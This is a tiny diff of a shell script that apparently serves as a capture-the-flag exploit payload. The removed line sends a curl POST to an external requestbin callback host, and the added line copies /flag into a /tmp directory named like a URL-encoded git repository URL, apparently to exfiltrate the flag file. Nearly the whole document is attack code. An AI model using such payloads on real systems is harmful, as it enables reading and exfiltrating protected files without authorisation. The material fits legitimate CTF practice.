@@ -1,4 +1,3 @@
 #!/bin/sh
 
-curl -X POST -d "fizz=buzz" dnsdatacheck.hmlwe78fu65kexbt.b.requestbin.net
-
+cat /flag > /tmp/https%3A%2F%2Fgithub%2ecom%2Felectronixxx%2Ftop-secret%2egit/flag.txt
